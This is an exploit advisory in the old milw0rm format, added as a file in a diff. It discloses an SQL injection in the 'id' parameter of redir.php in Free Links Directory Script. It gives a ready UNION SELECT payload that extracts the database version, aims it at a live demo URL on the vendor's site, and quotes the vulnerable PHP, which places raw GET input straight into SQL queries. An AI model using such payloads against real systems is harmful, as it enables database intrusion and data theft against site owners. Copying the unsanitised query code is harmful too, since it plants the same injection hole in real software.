@@ -1,0 +1,31 @@
+#Free Links Directory Script (id) SQL Injection Vulnerability
+
+
+#Author: nuclear
+
+
+#site:
+http://flds-script.com
+
+
+#vuln:
+http://localhost/[path]/redir.php?id=-1%20UNION%20SELECT%201,2,@@version,4,5,6,7,8,9,10,11/*
+
+
+#vulnerable code:
+$ida = $_GET['id'];
+$link = mysql_fetch_array(mysql_query("select * from links where id=$ida"));
+$idcheck = mysql_numrows(mysql_query("select * from links where id=$ida"));
+
+
+#demo:
+http://flds-script.com/demo/redir.php?id=-1 UNION SELECT 1,2,@@version,4,5,6,7,8,9,10,11
+
+#notes:
+the injection does not work if trying to comment out the rest of the query.The result page will be a 404 but
+you can get the data of the injection in the url
+
+
+#greetz Mi4night, zYzTeM, THE_MAN, Pepe, I-O-W-A, Digitalfortress, DiGitalX, sys32-hack, sys32r, Whitestar
+
+# milw0rm.com [2008-12-14]
